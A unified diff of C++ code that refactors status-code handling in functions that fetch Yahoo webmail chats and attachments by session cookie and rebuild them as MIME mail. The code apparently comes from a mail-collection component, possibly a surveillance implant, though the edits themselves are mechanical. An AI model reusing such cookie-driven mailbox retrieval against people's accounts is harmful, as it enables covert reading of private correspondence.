-				if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != YAHOO_SUCCESS)
-					return YAHOO_ALLOC_ERROR;
+				if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 */
 			//get the email as name because sometimes the name is not present
@@ -1572,10 +1573,10 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 				else
 					strSeparator[0] = 0;
 
-				if(ReallocAndAppendString(&lpChatFields->strPeers, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
+				if(ReallocAndAppendString(&lpChatFields->strPeers, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 				{
 					znfree((LPVOID*)&lpChatFields->strPeers);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 			}
 		}
@@ -1603,10 +1604,10 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 				else
 					strSeparator[0] = 0;
 
-				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
+				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 				{
 					znfree((LPVOID*)&lpChatFields->strPeersID);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 			}
 
@@ -1614,8 +1615,8 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 			//get name (peer name)
 			if(jObj[strNameFld]->AsString().c_str() != NULL)
 			{
-				if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != YAHOO_SUCCESS)
-					return YAHOO_ALLOC_ERROR;
+				if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 */
 			//get the email as name because sometimes the name is not present
@@ -1626,16 +1627,16 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 				else
 					strSeparator[0] = 0;
 
-				if(ReallocAndAppendString(&lpChatFields->strPeers,  strSeparator,  (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
+				if(ReallocAndAppendString(&lpChatFields->strPeers,  strSeparator,  (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 				{
 					znfree((LPVOID*)&lpChatFields->strPeers);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 			}
 		}
 	}
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -1643,14 +1644,13 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 //request the chat associated to the id
 DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR strCookie)
 {
-	LPSTR	strGetMsg = "{\"method\": \"GetMessage\",\"params\": [{\"fid\": \"%S\",\"message\": [{\"blockImages\": \"none\",\"mid\": \"%s\",\"expandCIDReferences\": true, \"enableWarnings\": true,\"restrictCSS\": true}]}]}";
+	LPSTR	strGetMsg = (LPSTR)"{\"method\": \"GetMessage\",\"params\": [{\"fid\": \"%S\",\"message\": [{\"blockImages\": \"none\",\"mid\": \"%s\",\"expandCIDReferences\": true, \"enableWarnings\": true,\"restrictCSS\": true}]}]}";
 	LPSTR   strBuffer		= NULL;
 	LPSTR   strRecvBuffer	= NULL;	
 	LPWSTR	strReqID		= NULL;
 	LPWSTR  strTmp			= NULL;
 	LPWSTR	strURI			= NULL;	
-	DWORD	dwSize, dwRet, dwBufferSize, dwTotSize, dwError, dwMailDate=0;	
-	BOOL	bWriteSection;
+	DWORD	dwSize, dwRet, dwBufferSize, dwTotSize, dwError = 0, dwMailDate=0;	
 
 	//json vars
 	std::vector<int>::size_type j;	
@@ -1675,7 +1675,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 	if(strURI == NULL)
 	{
 		znfree((LPVOID*)&strReqID);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", lpYHParams->strWSSID, strReqID); // FIXME ARRAY	
 	znfree((LPVOID*)&strReqID);
@@ -1685,7 +1685,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 	if(strBuffer == NULL)
 	{		
 		znfree((LPVOID*)&strURI);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	//post buffer
@@ -1730,7 +1730,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 				if(!jMsg[0]->IsObject())
 				{
 					zndelete((LPVOID*)&jValue);
-					return YAHOO_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ERROR;
 				}
 
 				//json object containing the message
@@ -1743,12 +1743,12 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 				if(lpYHParams->dwLowTS > dwMailDate)
 				{
 					zndelete(jValue);
-					return YAHOO_SUCCESS;
+					return (DWORD)YahooStatus::YAHOO_SUCCESS;
 				}					
 */
 
 				//get chat info
-				if(YHGetChatInfo(lpChatFields, jObj) != YAHOO_SUCCESS)
+				if(YHGetChatInfo(lpChatFields, jObj) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 				{
 					//free memory
 					zndelete((LPVOID*)&jValue);
@@ -1760,7 +1760,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 
 				//part array
 				if(!jObj[strPartFld]->IsArray())
-					return YAHOO_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ERROR;
 				jArray = jObj[strPartFld]->AsArray();
 								
 				//loop into mail parts obj
@@ -1774,9 +1774,9 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 					dwRet = YHExtractChatFields(jObj, lpChatFields);
 					switch(dwRet)
 					{
-						case YAHOO_SKIP:
+						case (DWORD)YahooStatus::YAHOO_SKIP:
 							continue;
-						case YAHOO_SUCCESS:
+						case (DWORD)YahooStatus::YAHOO_SUCCESS:
 							break;
 						default:
 							//free memory and exit
@@ -1792,7 +1792,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 					}
 
 					//add the conversation to the buffer
-					if(YHAddChat(&strTmp, lpChatFields) != YAHOO_SUCCESS)
+					if(YHAddChat(&strTmp, lpChatFields) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 					{
 						//free memory and exit
 						dwError = dwRet;
@@ -1818,7 +1818,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 				if(strTmp == NULL)
 				{
 					zndelete((LPVOID*)&jValue);
-					return YAHOO_SKIP;
+					return (DWORD)YahooStatus::YAHOO_SKIP;
 				}
 
 				dwTotSize = wcslen(strTmp) + 1;
@@ -1830,7 +1830,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 					YHFreeChatFields(lpChatFields);
 					znfree((LPVOID*)&strTmp);
 					zndelete((LPVOID*)&jValue);
-					return YAHOO_ALLOC_ERROR;
+					return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 				}
 
 				//copy the chat to strText
@@ -1848,7 +1848,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 	{
 		//delete json value
 		zndelete((LPVOID*)&jValue);
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 	}
 
 	//delete json value
@@ -1856,9 +1856,9 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 
 	//if the mail is old, skip it
 	if(dwMailDate == 0)
-		return YAHOO_SKIP;
+		return (DWORD)YahooStatus::YAHOO_SKIP;
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -1868,32 +1868,15 @@ DWORD YHAddChat(LPWSTR *strChat, LPYAHOO_CHAT_FIELDS pFields)
 	//text
 	if(pFields->strText != NULL)
 	{
-		if(ReallocAndAppendString(strChat, pFields->strText) != YAHOO_SUCCESS)
+		if(ReallocAndAppendString(strChat, pFields->strText) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 		{
 			znfree((LPVOID*)strChat);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}
 	}
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
-
-/*
-//verify if it'a valid utf string
-BOOL VerifyWString(LPWSTR* pStr)
-{
-	DWORD dwLen = wcslen(*pStr);	
-
-	for(DWORD i=0; i<dwLen; i++)
-	{
-		if(*pStr[i] > 0xFF)
-			*pStr[i] = 0x20; //replace the invalid chars to blanks
-	}
-
-	return TRUE;
-}
-*/
-
 
 DWORD ConvertToUTF8(LPWSTR pIn, LPSTR* pOut)
 {
@@ -1905,12 +1888,12 @@ DWORD ConvertToUTF8(LPWSTR pIn, LPSTR* pOut)
 	//alloc dest buffer
 	*pOut = (LPSTR)zalloc(dwSize);
 	if(*pOut == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	//conversion
 	WideCharToMultiByte(CP_UTF8, 0, pIn, -1, *pOut, dwSize, 0 , 0);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 //encode a string with the algorithm specified and save it to the input string
@@ -1922,21 +1905,21 @@ DWORD AsciiBufToBase64(LPWSTR* pStr, LPWSTR strEncodingAlg)
 	size_t dwConv;
 
 	if(*pStr == NULL)
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 
 	if(_wcsicmp(strEncodingAlg, L"base64"))
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 
 	//convertion to UTF charset
-	if(ConvertToUTF8(*pStr, &strMB) != YAHOO_SUCCESS)
-		return YAHOO_ERROR;
+	if(ConvertToUTF8(*pStr, &strMB) != (DWORD)YahooStatus::YAHOO_SUCCESS)
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 
 	//encode the attachment
 	strTmp = base64_encodeY((LPBYTE)strMB, strlen(strMB));
 	znfree((LPVOID*)&strMB);
 
 	if(strTmp == NULL)		
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 
 	dwEncSize = strlen(strTmp);
 
@@ -1951,7 +1934,7 @@ DWORD AsciiBufToBase64(LPWSTR* pStr, LPWSTR strEncodingAlg)
 	{
 		znfree((LPVOID*)&pOldBuf);
 		znfree((LPVOID*)&strTmp);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	SecureZeroMemory(*pStr, dwNewSize * sizeof(WCHAR));
@@ -1985,7 +1968,7 @@ DWORD AsciiBufToBase64(LPWSTR* pStr, LPWSTR strEncodingAlg)
 	znfree((LPVOID*)&strConv);
 	znfree((LPVOID*)&strTmp);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -1997,20 +1980,20 @@ DWORD YHEncodeAttachment(LPYAHOO_MAIL_ATTACHMENT pAttachment, LPWSTR strEncoding
 	size_t dwConv;
 
 	if((pAttachment->strAttachment == NULL) || (pAttachment->dwSize == 0))
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 
 	if(!_wcsicmp(strEncodingAlg, L"base64"))
 	{
 		//encode the attachment
 		strTmp = base64_encodeY((LPBYTE)pAttachment->strAttachment, pAttachment->dwSize);
 		if(strTmp == NULL)		
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		
 		dwEncSize = strlen(strTmp);
 	}
 	else
 	{
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 	}
 
 	//determine the number of lines
@@ -2022,7 +2005,7 @@ DWORD YHEncodeAttachment(LPYAHOO_MAIL_ATTACHMENT pAttachment, LPWSTR strEncoding
 	if(pAttachment->strEncodedAttachment == NULL)
 	{
 		znfree((LPVOID*)&strTmp);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	SecureZeroMemory(pAttachment->strEncodedAttachment, dwNewSize * sizeof(WCHAR));
@@ -2034,7 +2017,7 @@ DWORD YHEncodeAttachment(LPYAHOO_MAIL_ATTACHMENT pAttachment, LPWSTR strEncoding
 		znfree((LPVOID*)&strTmp);
 		znfree((LPVOID*)&pAttachment->strAttachment);
 		znfree((LPVOID*)&pAttachment->strEncodedAttachment);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 	dwLen = dwLineLen;
 
@@ -2064,7 +2047,7 @@ DWORD YHEncodeAttachment(LPYAHOO_MAIL_ATTACHMENT pAttachment, LPWSTR strEncoding
 	znfree((LPVOID*)&strTmp);
 	znfree((LPVOID*)&pAttachment->strAttachment);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -2079,13 +2062,13 @@ DWORD YHGetMailAttachment(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 	//get mail body
 	strURI = (LPWSTR)zalloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
 	if(strURI == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	strEncoded = EncodeURL(strMailID);
 	if(strEncoded == NULL)
 	{
 		znfree((LPVOID*)&strURI);
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 	}
 
 	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ya/download?mid=%S&fid=%s&pid=%s&tnef=&clean=0", strEncoded, pYHParams->strMailFolder, pYHMailFields->strPartId);
@@ -2101,7 +2084,7 @@ DWORD YHGetMailAttachment(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 		//free heap		
 		znfree((LPVOID*)&strRecvBuffer);
 
-		return YAHOO_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ERROR;
 	}
 
 	//save the attachment
@@ -2115,7 +2098,7 @@ DWORD YHGetMailAttachment(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 		dwRet = YHEncodeAttachment(pAttachment, pYHMailFields->strEncoding);
 	}
 	else
-		dwRet = YAHOO_ALLOC_ERROR;
+		dwRet = (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	//free heap
 	znfree((LPVOID*)&strRecvBuffer);
@@ -2134,12 +2117,12 @@ DWORD YHAssembleMail(LPSTR strMailHeader, LPSTR strMailBody, LPSTR *strMail)
 
 	*strMail = (LPSTR)zalloc(dwSize);
 	if(*strMail == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	SecureZeroMemory(*strMail, dwSize);
 
 	sprintf_s(*strMail, dwSize, "%s\r\n%s", strMailHeader, strMailBody);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -2177,7 +2160,7 @@ DWORD YHAddSectionText(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 /*
 	strField = (LPWSTR)malloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
 	if(strField == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 */
 	//mail body size
 	if(*strMail != NULL)
@@ -2191,18 +2174,18 @@ DWORD YHAddSectionText(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 		if(!_wcsicmp(pFields->strEncoding, L"quoted-printable"))
 		{
 			//buffer convertion to quoted-printable
-			if(AsciiBufToQP(pFields->strText, wcslen(pFields->strText)+1, &strQP) != YAHOO_SUCCESS)
+			if(AsciiBufToQP(pFields->strText, wcslen(pFields->strText)+1, &strQP) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 			{				
 				znfree((LPVOID*)&strQP);
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 
 			//text
-			if(ReallocAndAppendString(strMail, strQP) != YAHOO_SUCCESS)
+			if(ReallocAndAppendString(strMail, strQP) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 			{
 				znfree((LPVOID*)strMail);
 				znfree((LPVOID*)&strQP);
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 
 			//free memory
@@ -2211,38 +2194,38 @@ DWORD YHAddSectionText(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 		else if(!_wcsicmp(pFields->strEncoding, L"base64"))
 		{
 			//base64 encoding
-			if(AsciiBufToBase64(&pFields->strText, pFields->strEncoding) != YAHOO_SUCCESS)
+			if(AsciiBufToBase64(&pFields->strText, pFields->strEncoding) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 			{				
 				znfree((LPVOID*)&pFields->strText);
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 
 			//text
-			if(ReallocAndAppendString(strMail, pFields->strText) != YAHOO_SUCCESS)
+			if(ReallocAndAppendString(strMail, pFields->strText) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 			{
 				znfree((LPVOID*)strMail);
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}			
 		}
 		else
 		{
 			//text
-			if(ReallocAndAppendString(strMail, pFields->strText) != YAHOO_SUCCESS)
+			if(ReallocAndAppendString(strMail, pFields->strText) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 			{
 				znfree((LPVOID*)strMail);
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 		}
 
 		//wcscpy(strField, L"\r\n");
-		if(ReallocAndAppendString(strMail, L"\r\n") != YAHOO_SUCCESS)
+		if(ReallocAndAppendString(strMail, (WCHAR *)L"\r\n") != (DWORD)YahooStatus::YAHOO_SUCCESS)
 		{
 			znfree((LPVOID*)strMail);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}
 	}
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -2255,7 +2238,7 @@ DWORD YHAddSectionHeader(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 
 	strField = (LPWSTR)malloc(YAHOO_ALLOC_SIZE * sizeof(WCHAR));
 	if(strField == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	//mail body size
 	if(*strMail != NULL)
@@ -2267,11 +2250,11 @@ DWORD YHAddSectionHeader(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 	if(pFields->strType != NULL)
 	{
 		swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-Type: %s/%s; ", pFields->strType, pFields->strSubType);
-		if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
+		if(ReallocAndAppendString(strMail, strField) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 		{
 			znfree((LPVOID*)strMail);
 			znfree((LPVOID*)&strField);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}
 	}
 
@@ -2317,25 +2300,25 @@ DWORD YHAddSectionHeader(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 			swprintf_s(strField, YAHOO_ALLOC_SIZE, L"\r\n\t%s\r\n", pFields->strTypeParams);
 		}
 		
-		if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
+		if(ReallocAndAppendString(strMail, strField) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 		{
 			znfree((LPVOID*)strMail);
 			znfree((LPVOID*)&strField);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}
 		
 		if(bBoundary == TRUE)
 		{						
 			wcscpy(strField, L"\r\n");
-			if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
+			if(ReallocAndAppendString(strMail, strField) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 			{			
 				znfree((LPVOID*)strMail);
 				znfree((LPVOID*)&strField);
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 
 			znfree((LPVOID*)&strField);
-			return YAHOO_SUCCESS;
+			return (DWORD)YahooStatus::YAHOO_SUCCESS;
 		}
 		
 	}	
@@ -2344,11 +2327,11 @@ DWORD YHAddSectionHeader(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 	if(pFields->strDisposition != NULL)
 	{
 		swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-Disposition: %s\r\n", pFields->strDisposition);
-		if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
+		if(ReallocAndAppendString(strMail, strField) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 		{
 			znfree((LPVOID*)strMail);
 			znfree((LPVOID*)&strField);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}		
 	}
 
@@ -2361,11 +2344,11 @@ DWORD YHAddSectionHeader(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 		else
 			swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-Transfer-Encoding: %s\r\n", pFields->strEncoding);
 
-		if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
+		if(ReallocAndAppendString(strMail, strField) != (DWORD)YahooStatus::YAHOO_SUCCESS)
 		{
 			znfree((LPVOID*)strMail);
 			znfree((LPVOID*)&strField);
-			return YAHOO_ALLOC_ERROR;
+			return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 		}
 	}
 
@@ -2374,26 +2357,26 @@ DWORD YHAddSectionHeader(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
 		if(pFields->strCids != NULL)
 		{
 			swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-ID: <%s>\r\n", pFields->strCids);
-			if(ReallocAndAppendString(strField, strMail) != YAHOO_SUCCESS)
+			if(ReallocAndAppendString(strField, strMail) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 			{
 				znfree((LPVOID*)&strField);
-				return YAHOO_ALLOC_ERROR;
+				return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 			}
 		}
 	*/
 
 	wcscpy(strField, L"\r\n");
-	if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
+	if(ReallocAndAppendString(strMail, strField) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 	{
 		znfree((LPVOID*)strMail);
 		znfree((LPVOID*)&strField);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	//free heap
 	znfree((LPVOID*)&strField);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 //add mail and section boundaries
@@ -2404,14 +2387,14 @@ DWORD YHAddMailBoundary(LPWSTR *strMail, LPYAHOO_MAIL_BOUNDARIES lpMailBoundarie
 	
 	strField = (LPWSTR)malloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
 	if(strField == NULL)
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 
 	dwCurrBoundary = lpMailBoundaries->dwCurrentItem;
 
 	if(lpMailBoundaries->lpBoundaries == NULL)
 	{
 		znfree((LPVOID*)&strField);
-		return YAHOO_SUCCESS;
+		return (DWORD)YahooStatus::YAHOO_SUCCESS;
 	}
 
 	if(bCloseSection == TRUE)
@@ -2431,17 +2414,17 @@ DWORD YHAddMailBoundary(LPWSTR *strMail, LPYAHOO_MAIL_BOUNDARIES lpMailBoundarie
 	}
 	
 	//append the boundary to the mail
-	if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
+	if(ReallocAndAppendString(strMail, strField) != (DWORD) YahooStatus::YAHOO_SUCCESS)
 	{
 		znfree((LPVOID*)strMail);
 		znfree((LPVOID*)&strField);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	//free heap memory
 	znfree((LPVOID*)&strField);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 
@@ -2452,7 +2435,7 @@ DWORD ReallocAndAppendString(__out LPWSTR *pBuffer, __in LPWSTR pwcsStrToAppend,
 	DWORD dwNewSize, dwSize, dwBufSize;
 
 	if(pwcsStrToAppend == NULL)
-		return YAHOO_SUCCESS;
+		return (DWORD)YahooStatus::YAHOO_SUCCESS;
 
 	//size of the string to append
 	dwSize = wcslen(pwcsStrToAppend);
@@ -2474,7 +2457,7 @@ DWORD ReallocAndAppendString(__out LPWSTR *pBuffer, __in LPWSTR pwcsStrToAppend,
 	if(*pBuffer == NULL)
 	{
 		znfree((LPVOID*)&pOldBuf);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	((*pBuffer)[dwBufSize]) = 0; //null 
@@ -2486,7 +2469,7 @@ DWORD ReallocAndAppendString(__out LPWSTR *pBuffer, __in LPWSTR pwcsStrToAppend,
 	if(pwcsStrAdd != NULL)
 		wcscat_s(*pBuffer, (dwBufSize + dwSize + 1), pwcsStrAdd);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 
 /*
@@ -2497,7 +2480,7 @@ DWORD ReallocAndAppendString(LPWSTR pwcsStrToAppend, LPWSTR *pBuffer)
 	DWORD dwNewSize, dwSize, dwBufSize;
 
 	if(pwcsStrToAppend == NULL)
-		return YAHOO_SUCCESS;
+		return (DWORD)YahooStatus::YAHOO_SUCCESS;
 
 	//size of the string to append
 	dwSize = wcslen(pwcsStrToAppend);
@@ -2515,7 +2498,7 @@ DWORD ReallocAndAppendString(LPWSTR pwcsStrToAppend, LPWSTR *pBuffer)
 	if(*pBuffer == NULL)
 	{
 		znfree((LPVOID*)&pOldBuf);
-		return YAHOO_ALLOC_ERROR;
+		return (DWORD)YahooStatus::YAHOO_ALLOC_ERROR;
 	}
 
 	((*pBuffer)[dwBufSize]) = 0; //null 
@@ -2523,7 +2506,7 @@ DWORD ReallocAndAppendString(LPWSTR pwcsStrToAppend, LPWSTR *pBuffer)
 	//add the new section
 	wcscat_s(*pBuffer, (dwBufSize + dwSize + 1), pwcsStrToAppend);
 
-	return YAHOO_SUCCESS;
+	return (DWORD)YahooStatus::YAHOO_SUCCESS;
 }
 */
 
@@ -2531,7 +2514,7 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 {
 	//parse the returned json tree
 	JSONArray  jArray;		
-	DWORD	dwLen, dwSize;
+	DWORD	dwLen;
 	WCHAR   strBuffer[32];
 	WCHAR   *pwsSub;
 	BOOL	bTextSection  = FALSE;
@@ -2551,14 +2534,14 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	WCHAR strTypeParamsFld[]	= { L't', L'y', L'p', L'e', L'P', L'a', L'r', L'a', L'm', L's', L'\0' };							//value
 	
 	if(!jMail[strPartIdFld]->IsString())
